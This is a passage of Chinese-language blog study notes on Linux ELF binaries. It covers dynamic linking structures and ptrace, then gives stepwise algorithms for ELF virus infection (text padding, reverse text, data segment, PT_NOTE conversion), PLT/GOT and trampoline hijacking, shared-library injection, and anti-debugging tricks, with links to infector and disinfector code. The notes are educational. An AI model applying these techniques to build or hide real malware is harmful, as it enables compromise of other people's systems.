class="line">&#125;Elf32_Dyn;</span><br></pre></td></tr></table></figure><p>d_tag字段保存了类型的定义参数，下面列出常用的比较重要的类型值：</p><p>1.DT_NEEDED：保存了所需的共享库名的字符串表偏移量。</p><p>2.DT_SYMTAB：动态符号表的地址，对应的节名.dynsym。</p><p>3.DT_HASH：符号散列表的地址，对应的节名.hash。</p><p>4.DT_STRTAB：符号字符串表的地址，对应的节名.dynstr。</p><p>5.DT_PLTGOT：全局偏移表的地址。</p><p>d_val成员保存了一个整型值，可以存放各种不同的数据。</p><p>d_ptr成员保存了一个内存虚址，可以指向链接器所需要的各种类型的地址。</p><p>链接器为每个动态库生成一个link_map结构条目，并将其存入到一个链表中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span>&#123;</span></span><br><span class="line">ElfW(Addr) l_addr;<span class="comment">//Base address shared object is loaded at.</span></span><br><span class="line"><span class="keyword">char</span> *l_name;<span class="comment">//Absolute file name object was found in.</span></span><br><span class="line">ElfW(Dyn) *l_ld;<span class="comment">//Dynamic section of the shared object.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span><span class="comment">//Chain of loaded objects.</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="编码一个ELF解析器"><a href="#编码一个ELF解析器" class="headerlink" title="编码一个ELF解析器"></a>编码一个ELF解析器</h2><h1 id="Linux进程追踪"><a href="#Linux进程追踪" class="headerlink" title="Linux进程追踪"></a>Linux进程追踪</h1><h2 id="ptrace"><a href="#ptrace" class="headerlink" title="ptrace"></a>ptrace</h2><p>ptrace可以附加到一个进程上并修改内存。</p><h2 id="进程寄存器状态和标记"><a href="#进程寄存器状态和标记" class="headerlink" title="进程寄存器状态和标记"></a>进程寄存器状态和标记</h2><h2 id="基于ptrace的调试器示例"><a href="#基于ptrace的调试器示例" class="headerlink" title="基于ptrace的调试器示例"></a>基于ptrace的调试器示例</h2><h2 id="内存感染类型"><a href="#内存感染类型" class="headerlink" title="内存感染类型"></a>内存感染类型</h2><table><thead><tr><th>感染技术</th><th>目标结果</th><th>寄存类型</th></tr></thead><tbody><tr><td>GOT感染</td><td>劫持共享库函数</td><td>进程内存或可执行文件</td></tr><tr><td>过程链接表(PLT)感染</td><td>劫持共享库函数</td><td>进程内存或可执行文件</td></tr><tr><td>.ctors/.dtors感染</td><td>将控制流转向恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>Function trampolines（函数蹦床）</td><td>劫持任意函数</td><td>进程内存或可执行文件</td></tr><tr><td>共享库注入</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>重定位代码注入</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>直接修改text段</td><td>插入恶意代码</td><td>进程内存或可执行文件</td></tr><tr><td>进程占用（将整段程序注入地址空间）</td><td>运行隐藏在现存进程中的完全不同的可执行文件</td><td>进程内存</td></tr></tbody></table><h2 id="进程镜像重建"><a href="#进程镜像重建" class="headerlink" title="进程镜像重建"></a>进程镜像重建</h2><h3 id="重建可执行文件的目标"><a href="#重建可执行文件的目标" class="headerlink" title="重建可执行文件的目标"></a>重建可执行文件的目标</h3><ul><li>进程ID作为参数，将该ID对应的进程镜像重建成对应的可执行文件。</li><li>构建节头的最小集，以便可以使用objdump和gdb这样的工具进行更精确的分析。</li></ul><h3 id="重建过程算法"><a href="#重建过程算法" class="headerlink" title="重建过程算法"></a>重建过程算法</h3><p>1.定位可执行文件(text段)的基址。</p><p>2.通过解析ELF文件头来定位程序头表。</p><p>3.解析程序头表，找出数据段。</p><p>4.将数据段读到缓存中，并定位数据段中的动态段，然后定位GOT。使用动态段中的d_tag来定位GOT。</p><p>5.一旦定位到GOT，就需要将GOT恢复到运行之前的装填。</p><p>6.需要修改为puts()保留的GOT条目，重新指向PLT存根代码，这段代码的作用是将GOT偏移地址压入栈。</p><p>7.选择性地重建节头表。然后将text段和data段(以及节头表)写到磁盘。</p><h1 id="ELF病毒技术"><a href="#ELF病毒技术" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h1><h2 id="ELF病毒技术-1"><a href="#ELF病毒技术-1" class="headerlink" title="ELF病毒技术"></a>ELF病毒技术</h2><p>ELF病毒的首要目标是劫持控制流，暂时改变程序执行的路径来执行寄生病毒。</p><h2 id="ELF病毒寄生代码感染方法"><a href="#ELF病毒寄生代码感染方法" class="headerlink" title="ELF病毒寄生代码感染方法"></a>ELF病毒寄生代码感染方法</h2><h3 id="Silvio填充感染"><a href="#Silvio填充感染" class="headerlink" title="Silvio填充感染"></a>Silvio填充感染</h3><p>这种方法利用了内存中text段和data段之间存在的一页大小的填充空间。</p><p>相关论文：Unix ELF parasites and viruses(<a href="http://vxheaven.org/lib/vsc01.html" target="_blank" rel="noopener">http://vxheaven.org/lib/vsc01.html</a>)</p><h4 id="text感染算法"><a href="#text感染算法" class="headerlink" title=".text感染算法"></a>.text感染算法</h4><p>1.将ELF文件头中的ehdr-&gt;e_shoff增加PAGE_SIZE的大小值。</p><p>2.定位text段的phdr。</p><ul><li>将入口点修改为寄生代码的位置：ehdr-&gt;e_entry=phdr[TEXT].p_vaddr+phdr[TEXT].p_filesz。</li><li>将phdr[TEXT].p_filesz增加寄生代码的长度值。</li><li>将phdr[TEXT].p_memsz增加寄生代码的长度值。</li></ul><p>3.对每个phdr，如果对应的段位于寄生代码之后，则将phdr[x].p_offset增加PAGE_SIZE大小。</p><p>4.找到text段的最后一个shdr，将shdr[x].sh_size增加寄生代码长度值。</p><p>5.对每个位于寄生代码插入位置之后的shdr，将shdr[x].sh_offset增加PAGE_SIZE大小。</p><p>6.将真正的寄生代码插入到text段的file_base+phdr[TEXT].p_filesz。</p><p>相关代码示例： <a href="http://www.bitlackeys.org/projects/lpv.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/lpv.c</a></p><h3 id="逆向text感染"><a href="#逆向text感染" class="headerlink" title="逆向text感染"></a>逆向text感染</h3><p>前提：堆text段进行逆向扩展，在逆向扩展过程中，需要将text段的虚拟地址缩减PAGE_ALIGN(parasite_size)。</p><h4 id="逆向text感染算法"><a href="#逆向text感染算法" class="headerlink" title="逆向text感染算法"></a>逆向text感染算法</h4><p>1.将ehdr-&gt;e_shoff增加PAGE_ROUND(parasite_len)</p><p>2.找到text段和phdr，保存p_vaddr的初始值。</p><ul><li>将p_vaddr减小PAGE_ROUND(parasite_len)。</li><li>将p_paddr减小PAGE_ROUND(parasite_len)。</li><li>将p_filesz增加PAGE_ROUND(parasite_len)。</li><li>将p_memsz增加PAGE_ROUND(parasite_len)。</li></ul><p>3.找出所有的p_offset比text的p_offset的phdr，并将对应的p_offset增加PAGE_ROUND(parasite_len)；这步操作会将phdr前移，为逆向text扩展腾出空间。</p><p>4.将ehdr-&gt;e_entry设置为：</p><p>orig_text_vaddr - PAGE_ROUND(parasite_len) +sizeof(ElfN_Ehdr)</p><p>5.将ehdr_e_phoff增加PAGE_ROUND(parasite_len)。</p><p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p><p>相关代码：<a href="http://www.bitlackeys.org/projects/text-infector.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/text-infector.tgz</a> </p><p>相应杀毒程序：<a href="http://www.bitlackeys.org/projects/skeksi_disinfect.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/skeksi_disinfect.c</a></p><h3 id="data段感染"><a href="#data段感染" class="headerlink" title="data段感染"></a>data段感染</h3><h4 id="data段感染算法"><a href="#data段感染算法" class="headerlink" title="data段感染算法"></a>data段感染算法</h4><p>1.将ehdr_e_shoff增加寄生代码的长度。</p><p>2.定位data段phdr。</p><ul><li>将ehdr-&gt;e_entry指向寄生代码所在位置：phdr-&gt;p_vaddr + phdr-&gt;p_filesz</li><li>将phdr-&gt;p_filesz增加寄生代码长度</li><li>将phdr-&gt;p_memsz增加寄生代码的长度</li></ul><p>3.调整.bss节头，使其偏移量和地址能够反映出寄生代码的结束位置。</p><p>4.设置data段的权限(设置了NX-bit的系统)：</p><ul><li>phdr[DATA].p_flags != PF_X;</li></ul><p>5.（可选）使用假名为寄生代码添加一个节头。（防止有人运行了/usr/bin/strip<infected_program>，会将没有进行节头说明的寄生代码清理掉）</p><p>6.创建一个新的二进制文件映射出所有的修改，插入真正的寄生代码，然后覆盖掉旧的二进制文件。</p><h2 id="PT-NOTE到PT-LOAD转换感染"><a href="#PT-NOTE到PT-LOAD转换感染" class="headerlink" title="PT_NOTE到PT_LOAD转换感染"></a>PT_NOTE到PT_LOAD转换感染</h2><p>原理：将PT_NOTE段的类型改为PT_LOAD，然后将段的位置移到其他所有段之后。当然，也可以通过创建一个PT_LOAD phdr条目来创建一个新的段，但是由于程序在没有PT_NOTE段时仍将执行，因此将其转换为PT_LOAD类型。</p><h4 id="PT-NOTE到PT-LOAD转换感染算法"><a href="#PT-NOTE到PT-LOAD转换感染算法" class="headerlink" title="PT_NOTE到PT_LOAD转换感染算法"></a>PT_NOTE到PT_LOAD转换感染算法</h4><p>1.定位data段phdr。</p><ul><li>找到data段结束的地址：ds_end_addr = phdr-&gt;p_vaddr + p_memsz</li><li>找到data段结束的文件偏移量：da_end_off = phdr-&gt;p_offset + p_filesz</li><li>获取到可加载段的对齐大小：align_size = phdr-&gt;p_align</li></ul><p>2.定位PT_NOTE phdr。</p><ul><li><p>将phdr转换成PT_LOAD：phdr-&gt;p_type = PT_LOAD；</p></li><li><p>将下面起始地址赋给phdr：ds_end_addr + align_size</p></li><li><p>将寄生代码的长度赋给phdr：phdr-&gt;p_filesz += parasite_size;  phdr-&gt;p_memsz += parasite_size</p></li></ul><p>3.对新建的段进行说明：ehdr-&gt;e_shoff += parasite_size。</p><p>4.创建一个新的二进制文件映射出ELF头的修改和新的段，插入真正的寄生代码。</p><h2 id="感染控制流"><a href="#感染控制流" class="headerlink" title="感染控制流"></a>感染控制流</h2><h3 id="直接PLT感染"><a href="#直接PLT感染" class="headerlink" title="直接PLT感染"></a>直接PLT感染</h3><p>修改PLT代码，使其存放一条完全不同的指令来改变控制流。</p><h3 id="函数蹦床"><a href="#函数蹦床" class="headerlink" title="函数蹦床"></a>函数蹦床</h3><p>使用某种能够改变控制流的分支指令重写函数代码的前5~7个字节。重写完后调用的的即为要想调用的函数。</p><h3 id="重写-ctors-dtors函数指针"><a href="#重写-ctors-dtors函数指针" class="headerlink" title="重写.ctors/.dtors函数指针"></a>重写.ctors/.dtors函数指针</h3><p>.ctors/.init_array 函数指针会在 main()函数调用之前触发。这就意味着，可以通过重写某个指向正确地址的指针来将控制流指向病毒或者寄生代码。.dtors/.fini_array 函数指针在 main()函数执行完之后才被触发。</p><h3 id="GOT感染或PLT-GOT重定向"><a href="#GOT感染或PLT-GOT重定向" class="headerlink" title="GOT感染或PLT/GOT重定向"></a>GOT感染或PLT/GOT重定向</h3><p>相关论文： Modern Day ELF Runtime infection via GOT poisoning（<a href="http://vxheaven.org/lib/vrn00.html）" target="_blank" rel="noopener">http://vxheaven.org/lib/vrn00.html）</a></p><h3 id="感染数据结构"><a href="#感染数据结构" class="headerlink" title="感染数据结构"></a>感染数据结构</h3><h3 id="函数指针重写"><a href="#函数指针重写" class="headerlink" title="函数指针重写"></a>函数指针重写</h3><h2 id="进程内存病毒和rootkits——远程代码注入技术"><a href="#进程内存病毒和rootkits——远程代码注入技术" class="headerlink" title="进程内存病毒和rootkits——远程代码注入技术"></a>进程内存病毒和rootkits——远程代码注入技术</h2><h3 id="共享库注入"><a href="#共享库注入" class="headerlink" title="共享库注入"></a>共享库注入</h3><h4 id="so感染-ET-DYN感染"><a href="#so感染-ET-DYN感染" class="headerlink" title=".so感染/ET_DYN感染"></a>.so感染/ET_DYN感染</h4><p>这项技术可以用来将一个共享库注入到已存在的进程地址空间中，注入共享库后，需要通过PLT/GOT重定向、函数蹦床等将控制流使用前面的感染点之一重定向到共享库。</p><h5 id="so感染——使用LD-PRELOAD"><a href="#so感染——使用LD-PRELOAD" class="headerlink" title=".so感染——使用LD_PRELOAD"></a>.so感染——使用LD_PRELOAD</h5><p>通过设置LD_PRELOAD环境变量，将我们想要的共享库放在其他共享库之前加载。</p><h5 id="so感染——利用open-mmap"><a href="#so感染——利用open-mmap" class="headerlink" title=".so感染——利用open()/mmap()"></a>.so感染——利用open()/mmap()</h5><p>通过往已存在的进程的text段注入shellcode，并执行shellcode。利用共享库的open/mmap操作，将任何文件注入到进程的地址空间中。</p><h5 id="so感染——利用dloen"><a href="#so感染——利用dloen" class="headerlink" title=".so感染——利用dloen()"></a>.so感染——利用dloen()</h5><p>程序可以通过dlopen()/_libc_dlopen_mode()函数凭空加载一个共享库。</p><p>但在使用_libc_dlopen_mode()之前，要先得到想要感染进程中的libc基址，解析_libc_dlopen_mode()的符号，然后将符号值st_value与libc相加得到最终地址。</p><h5 id="so感染——使用vdso控制技术"><a href="#so感染——使用vdso控制技术" class="headerlink" title=".so感染——使用vdso控制技术"></a>.so感染——使用vdso控制技术</h5><h3 id="text段代码注入"><a href="#text段代码注入" class="headerlink" title="text段代码注入"></a>text段代码注入</h3><h3 id="可执行文件注入"><a href="#可执行文件注入" class="headerlink" title="可执行文件注入"></a>可执行文件注入</h3><p>elfdemon： <a href="http://www.bitlackeys.org/projects/elfdemon.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfdemon.tgz</a></p><h3 id="重定位代码注入——ET-REL注入"><a href="#重定位代码注入——ET-REL注入" class="headerlink" title="重定位代码注入——ET_REL注入"></a>重定位代码注入——ET_REL注入</h3><h2 id="ELF反调试和封装技术"><a href="#ELF反调试和封装技术" class="headerlink" title="ELF反调试和封装技术"></a>ELF反调试和封装技术</h2><h3 id="PTRACE-TRACEME技术"><a href="#PTRACE-TRACEME技术" class="headerlink" title="PTRACE_TRACEME技术"></a>PTRACE_TRACEME技术</h3><p>进程追踪有一个特性：一个程序在同一时间只能被一个进程追踪。</p><p>这项技术的思路就是让程序追踪自身，这样调试器就无法附加到该进程了。</p><h3 id="SIGTRAP处理技术"><a href="#SIGTRAP处理技术" class="headerlink" title="SIGTRAP处理技术"></a>SIGTRAP处理技术</h3><p>使用这项技术，程序可以设置一个信号处理器来捕获SIGTRAP信号，然后故意发出一个断点指令，信号处理器捕捉到SIGTRAP信号后，会将一个全局变量从0加到1。随后检查这个全局变量，如果为1，则说明未被调试；如果为0，说明正在被调试，为了防止被调试，可以终止进程或者退出。</p><h3 id="proc-self-status技术"><a href="#proc-self-status技术" class="headerlink" title="/proc/self/status技术"></a>/proc/self/status技术</h3><p>/proc/self/status中的”TracerPid”对应值0表示没用被追踪，如果不为0，则表明正在被追踪。</p><h3 id="代码混淆技术"><a href="#代码混淆技术" class="headerlink" title="代码混淆技术"></a>代码混淆技术</h3><p>通过修改汇编层的代码来引入不明确的分支指令或者未对其指令，使得反汇编程序无法正确地读取字节码文件。</p><h3 id="字符串表转换技术"><a href="#字符串表转换技术" class="headerlink" title="字符串表转换技术"></a>字符串表转换技术</h3><p>这项技术会打乱每个符号名和节相关信息的顺序，以致可能出现的结果就是所有的节头、函数名和符号名看上去都是乱序混在一起的。</p><p>相关代码：<a href="http://www.bitlackeys.org/projects/elfscure.c" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/elfscure.c</a> </p><h2 id="ELF病毒检测和杀毒"><a href="#ELF病毒检测和杀毒" class="headerlink" title="ELF病毒检测和杀毒"></a>ELF病毒检测和杀毒</h2><p>VMA Voodoo（<a href="http://www.bitlackeys.org/#vmavudu）" target="_blank" rel="noopener">http://www.bitlackeys.org/#vmavudu）</a><br>AVU(Anti Virus UNIX）：<a href="http://www.bitlackeys.org/projects/avu32.tgz" target="_blank" rel="noopener">http://www.bitlackeys.org/projects/avu32.tgz</a></p><h1 id="Linux二进制保护"><a href="#Linux二进制保护" class="headerlink" title="Linux二进制保护"></a>Linux二进制保护</h1><h2 id="ELF二进制加壳器"><a href="#ELF二进制加壳器" class="headerlink" title="ELF二进制加壳器"></a>ELF二进制加壳器</h2><p>加壳器：用来对可执行文件进行压缩或加密，来对代码和数据进行混淆。</p><h2 id="存根机制和用户层执行"><a href="#存根机制和用户层执行" class="headerlink" title="存根机制和用户层执行"></a>存根机制和用户层执行</h2><p>软件保护器由以下两个程序组成：保护阶段的代码（应用到目标二进制文件上的保护程序）、运行时引擎或存根（与目标二进制文件合并在一起，负责运行时反混淆和反调试的程序。）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Linux环境和相关工具&quot;&gt;&lt;a href=&quot;#Linux环境和相关工具&quot; class=&quot;headerlink&quot; title=&quot;Linux环境和相关工具&quot;&gt;&lt;/a&gt;Linux环境和相关工具&lt;/h1&gt;&lt;h2 id=&quot;Linux工具&quot;&gt;&lt;a href=&quot;#Linux工
      
    
    </summary>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="笔记" scheme="https://nuoye-blog.github.io/tags/%E7%AC%94%E8%AE%B0/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="elf" scheme="https://nuoye-blog.github.io/tags/elf/"/>
    
  </entry>
  
</feed>
